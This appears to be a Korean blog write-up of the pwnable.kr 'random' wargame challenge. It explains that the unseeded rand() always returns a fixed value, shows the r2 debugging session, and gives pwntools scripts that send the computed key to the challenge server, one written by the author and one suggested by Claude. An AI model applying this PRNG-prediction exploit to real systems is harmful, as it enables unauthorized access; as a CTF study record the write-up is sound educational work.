---
title: "[pwnable.kr] random"
published: 2026-09-26
description: Solving a wargame challenge
category: CTF
tags: [pwnable.kr, study]
draft: false
---

# 랜덤하지 않은 랜덤 문제

바이너리 정보는 아래와 같다.

```bash
arch     x86
baddr    0x0
binsz    14247
bintype  elf
bits     64
canary   true
class    ELF64
compiler GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      true
relocs   true
relro    full
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

## 코드

```c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xcafebabe ){
		printf("Good!\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}
```

# 풀이

문제가 간단하고, 검색 없이 바로 풀렸기 때문에 여기서 설명하겠다.  
`rand()` 호출 전에 `srand()`로 시드를 설정하지 않았기 때문에 `1`로 시드가 고정된다.  
따라서 `rand()`를 호출해도 항상 같은 값이 반환된다.  
그러므로 `gdb` 또는 `r2`로 실행 도중 `random` 변수의 값을 확인한 뒤 이 값을 `0xcafebabe`와 XOR한다.  
이러면 올바른 `key`값을 구하게 된다.

## 짤막한 r2 사용

```bash
[0x74961b01c540]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x74961b01c540]> pdf @ main
            ; DATA XREF from entry0 @ 0x5bb522536138
┌ 212: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_1ch @ rbp-0x1c
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_8h @ rbp-0x8
│           0x5bb522536209      f30f1efa       endbr64
│           0x5bb52253620d      55             push rbp
│           0x5bb52253620e      4889e5         mov rbp, rsp
│           0x5bb522536211      53             push rbx
│           0x5bb522536212      4883ec18       sub rsp, 0x18
│           0x5bb522536216      64488b042528.  mov rax, qword fs:[0x28]
│           0x5bb52253621f      488945e8       mov qword [var_18h], rax
│           0x5bb522536223      31c0           xor eax, eax
│           0x5bb522536225      b800000000     mov eax, 0
│           0x5bb52253622a      e8e1feffff     call sym.imp.rand       ; int rand(void)
│           0x5bb52253622f      8945e4         mov dword [var_1ch], eax
│           0x5bb522536232      c745e0000000.  mov dword [var_20h], 0
│           0x5bb522536239      488d45e0       lea rax, [var_20h]
│           0x5bb52253623d      4889c6         mov rsi, rax
│           0x5bb522536240      488d05c10d00.  lea rax, [0x5bb522537008] ; "%d"
│           0x5bb522536247      4889c7         mov rdi, rax
│           0x5bb52253624a      b800000000     mov eax, 0
│           0x5bb52253624f      e8acfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x5bb522536254      8b45e0         mov eax, dword [var_20h]
│           0x5bb522536257      3345e4         xor eax, dword [var_1ch]
│           0x5bb52253625a      3dbebafeca     cmp eax, 0xcafebabe
│       ┌─< 0x5bb52253625f      754e           jne 0x5bb5225362af
│       │   0x5bb522536261      488d05a30d00.  lea rax, str.Good_      ; 0x5bb52253700b ; "Good!"
│       │   0x5bb522536268      4889c7         mov rdi, rax
│       │   0x5bb52253626b      e840feffff     call sym.imp.puts       ; int puts(const char *s)
│       │   0x5bb522536270      b800000000     mov eax, 0
│       │   0x5bb522536275      e866feffff     call sym.imp.getegid
│       │   0x5bb52253627a      89c3           mov ebx, eax
│       │   0x5bb52253627c      b800000000     mov eax, 0
│       │   0x5bb522536281      e85afeffff     call sym.imp.getegid
│       │   0x5bb522536286      89de           mov esi, ebx
│       │   0x5bb522536288      89c7           mov edi, eax
│       │   0x5bb52253628a      b800000000     mov eax, 0
│       │   0x5bb52253628f      e85cfeffff     call sym.imp.setregid
│       │   0x5bb522536294      488d05760d00.  lea rax, str._bin_cat_flag ; 0x5bb522537011 ; "/bin/cat flag"
│       │   0x5bb52253629b      4889c7         mov rdi, rax
│       │   0x5bb52253629e      b800000000     mov eax, 0
│       │   0x5bb5225362a3      e828feffff     call sym.imp.system     ; int system(const char *string)
│       │   0x5bb5225362a8      b800000000     mov eax, 0
│      ┌──< 0x5bb5225362ad      eb14           jmp 0x5bb5225362c3
│      │└─> 0x5bb5225362af      488d056a0d00.  lea rax, str.Wrong__maybe_you_should_try_232_cases. ; 0x5bb522537020 ; "Wrong, maybe you should try 2^32 cases."
│      │    0x5bb5225362b6      4889c7         mov rdi, rax
│      │    0x5bb5225362b9      e8f2fdffff     call sym.imp.puts       ; int puts(const char *s)
│      │    0x5bb5225362be      b800000000     mov eax, 0
│      │    ; CODE XREF from main @ 0x5bb5225362ad
│      └──> 0x5bb5225362c3      488b55e8       mov rdx, qword [var_18h]
│           0x5bb5225362c7      64482b142528.  sub rdx, qword fs:[0x28]
│       ┌─< 0x5bb5225362d0      7405           je 0x5bb5225362d7
│       │   0x5bb5225362d2      e8e9fdffff     call sym.imp.__stack_chk_fail
│       └─> 0x5bb5225362d7      488b5df8       mov rbx, qword [var_8h]
│           0x5bb5225362db      c9             leave
└           0x5bb5225362dc      c3             ret
[0x74961b01c540]> db 0x5bb52253622f
[0x74961b01c540]> dc
hit breakpoint at: 0x5bb52253622f
[0x5bb52253622f]> dr eax
0x6b8b4567
[0x5bb52253622f]>
```

별로 큰 값이 아닌 것 같아서 습관적으로 `eax` 값을 확인했다.  
추가로, 동적 디버깅 대신 간단한 스크립트를 작성한다고 치면 아래와 같이:

## 랜덤값 보기22

```python
python3 -c "import ctypes; libc = ctypes.CDLL('libc.so.6'); libc.srand(1); print(hex(libc.rand()))"
```

`cyptes` 라이브러리 가져와서 해당 바이너리와 알맞는 `libc.so.6` 확보 후 돌려보면 된다.  
적당히 둘러 말하자면 아무 **linux**에서 실행하고 그 값을 원격에도 넣으면 된다.  
보통 `0x6b8b4567`가 나온다.

## 익스

```python
from pwn import *

context.binary = elf = ELF('./random')
context.log_level = "info"

p = remote('pwnable.kr', 10005)
#p = process()

sol = 0xcafebabe ^ 0x6b8b4567

p.sendline(str(sol).encode())

p.interactive()
```

이번에 코드 짜면서 뭐랄까 약간 인공지능이 된 느낌을 받았다.  
혼자 자만심에 기뻐하고 있다가 `claude` << (안 쓰는데 agy에 있길래 opus 4.6 오랜만에 써 봄)에게 수정점을 물어봤다.

그런데,,,

```py
from pwn import *
import ctypes

# ── 설정 ──
HOST, PORT = 'pwnable.kr', 10005
TARGET_HASH = 0xcafebabe

context.log_level = "info"

# ── rand() 시뮬레이션 (srand 미호출 = srand(1)) ──
# libc 없이도 glibc 기본 시드의 첫 번째 rand() 값은 고정
RAND_DEFAULT_SEED1 = 0x6b8b4567  # libc.srand(1); libc.rand()

def solve(rand_val: int, target: int) -> int:
    """XOR 역산으로 key 계산. signed 32-bit로 변환."""
    key = target ^ rand_val
    # unsigned → signed 32-bit 변환
    if key >= 0x80000000:
        key -= 0x100000000
    return key

# ── 익스플로잇 ──
key = solve(RAND_DEFAULT_SEED1, TARGET_HASH)
log.info(f"rand() = {hex(RAND_DEFAULT_SEED1)}")
log.info(f"key    = {key} ({hex(key & 0xFFFFFFFF)})")

p = remote(HOST, PORT)
p.sendline(str(key).encode())
p.interactive()
```

어음,, 범용적이다. 뭐랄까, 그 분위기 휩쓸려서 쓰는 코드 느낌.  
누가 이런 걸 가르친 지는 모르겠다. 그래도 어느 정도 생각하면서 스크립트라던가 짜야 하지 않는가  
라고 나를 되돌아보게 된 것 같다.
